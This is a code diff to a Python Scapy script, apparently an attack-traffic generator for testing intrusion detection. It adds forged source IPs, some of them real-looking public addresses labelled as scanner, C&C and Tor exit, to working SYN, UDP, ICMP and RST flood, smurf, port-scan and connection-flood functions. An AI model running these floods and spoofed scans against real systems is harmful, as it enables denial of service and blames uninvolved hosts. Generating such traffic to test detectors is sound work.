@@ -26,37 +26,72 @@ from scapy.all import IP, TCP, UDP, ICMP, DNS, DNSQR, Raw, send, RandShort, conf
 
 conf.verb = 0
 
+# ========== 模拟攻击源IP池（不同网段，模拟真实多源攻击） ==========
+ATTACKER_IPS = [
+    "10.0.0.100",       # 内网段A
+    "172.16.5.23",      # 内网段B
+    "192.168.1.88",     # 内网段C
+    "10.10.18.201",     # 内网段D
+    "45.33.32.156",     # 外网 — 扫描器
+    "203.0.113.50",     # 外网 — C&C
+    "198.51.100.77",    # 外网 — 僵尸网络
+    "185.220.101.42",   # 外网 — Tor出口
+]
+
+# 每个攻击大类分配不同的源IP段，保证同类攻击源IP一致、不同类攻击源IP不同
+_CATEGORY_IP = {
+    "DoS":          ["10.0.0.100", "172.16.5.23"],
+    "DDoS":         ["45.33.32.156", "198.51.100.77", "185.220.101.42"],
+    "PortScan":     ["10.10.18.201"],
+    "BruteForce":   ["192.168.1.88"],
+    "WebAttack":    ["203.0.113.50"],
+    "Infiltration": ["185.220.101.42"],
+    "Bot":          ["198.51.100.77", "203.0.113.50"],
+}
+
+# 当前攻击使用的源IP（由 main 中按类别设置）
+_current_src = [None]
+
+def _get_src():
+    """获取当前攻击源IP"""
+    return _current_src[0] or random.choice(ATTACKER_IPS)
+
+
 # ========== 快速发包工具 ==========
 
 def _flood_syn(target, dport, count, sport_base=40000):
     """快速 SYN Flood"""
+    src = _get_src()
     sports = [sport_base + i for i in range(5)]
     sent = 0
     while sent < count:
         n = min(100, count - sent)
-        pkt = IP(dst=target) / TCP(sport=random.choice(sports), dport=dport, flags="S",
+        pkt = IP(src=src, dst=target) / TCP(sport=random.choice(sports), dport=dport, flags="S",
                                     seq=random.randint(0, 2**32 - 1))
         send(pkt, count=n, inter=0)
         sent += n
 
 def _flood_udp(target, dport, count, payload_size=128):
     """快速 UDP Flood"""
+    src = _get_src()
     sent = 0
     while sent < count:
         n = min(100, count - sent)
-        pkt = IP(dst=target) / UDP(sport=RandShort(), dport=dport) / Raw(load=bytes(payload_size))
+        pkt = IP(src=src, dst=target) / UDP(sport=RandShort(), dport=dport) / Raw(load=bytes(payload_size))
         send(pkt, count=n, inter=0)
         sent += n
 
 def _scan_ports(target, flags, start, count):
     """端口扫描"""
+    src = _get_src()
     for p in range(start, start + count):
-        send(IP(dst=target) / TCP(sport=RandShort(), dport=p, flags=flags))
+        send(IP(src=src, dst=target) / TCP(sport=RandShort(), dport=p, flags=flags))
         time.sleep(0.01)
 
 def _brute(target, dport, count, sport_base=40000):
     """暴力破解/连接尝试 — 批量发送确保被抓到"""
-    pkts = [IP(dst=target) / TCP(sport=sport_base + i, dport=dport, flags="S") for i in range(count)]
+    src = _get_src()
+    pkts = [IP(src=src, dst=target) / TCP(sport=sport_base + i, dport=dport, flags="S") for i in range(count)]
     send(pkts)
 
 
@@ -68,17 +103,19 @@ def dos_syn_flood(t):
 def dos_udp_flood(t):
     _flood_udp(t, 9999, 2100)
 def dos_icmp_flood(t):
+    src = _get_src()
     for _ in range(250):
-        send(IP(dst=t) / ICMP(type=8) / Raw(load=bytes(512)))
+        send(IP(src=src, dst=t) / ICMP(type=8) / Raw(load=bytes(512)))
 def dos_slowloris(t):
     _flood_syn(t, 8080, 550, 50000)
 def dos_rudy(t):
     _flood_syn(t, 8081, 550, 51000)
 def dos_tcp_rst(t):
+    src = _get_src()
     sent = 0
     while sent < 550:
         n = min(100, 550 - sent)
-        send(IP(dst=t) / TCP(sport=RandShort(), dport=80, flags="R"), count=n, inter=0)
+        send(IP(src=src, dst=t) / TCP(sport=RandShort(), dport=80, flags="R"), count=n, inter=0)
         sent += n
 
 # ────────── DDoS (5种) ──────────
@@ -91,8 +128,9 @@ def ddos_ntp_amp(t):
 def ddos_ssdp_amp(t):
     _flood_udp(t, 1900, 2100, 128)
 def ddos_smurf(t):
+    src = _get_src()
     for _ in range(250):
-        send(IP(dst=t) / ICMP(type=8) / Raw(load=b"SMURF" * 20))
+        send(IP(src=src, dst=t) / ICMP(type=8) / Raw(load=b"SMURF" * 20))
 
 # ────────── PortScan (5种) ──────────
 def scan_syn(t):
@@ -104,8 +142,9 @@ def scan_null(t):
 def scan_xmas(t):
     _scan_ports(t, "FPU", 1, 35)
 def scan_udp(t):
+    src = _get_src()
     for p in range(1, 36):
-        send(IP(dst=t) / UDP(sport=RandShort(), dport=p) / Raw(load=b"\x00"))
+        send(IP(src=src, dst=t) / UDP(sport=RandShort(), dport=p) / Raw(load=b"\x00"))
         time.sleep(0.01)
 
 # ────────── BruteForce (5种) ──────────
@@ -214,8 +253,11 @@ def main():
     for idx, cat, name, func in ATTACKS:
         if cat != current_cat:
             current_cat = cat
+            # 按攻击大类切换源IP，模拟不同攻击者
+            cat_ips = _CATEGORY_IP.get(cat, ATTACKER_IPS)
+            _current_src[0] = random.choice(cat_ips)
             print(f"\n{'─'*60}")
-            print(f"  ■ {cat}")
+            print(f"  ■ {cat}  (攻击源: {_current_src[0]})")
             print(f"{'─'*60}")
         print(f"  [{idx:2d}/35] {cat}/{name} ... ", end="", flush=True)
         try:
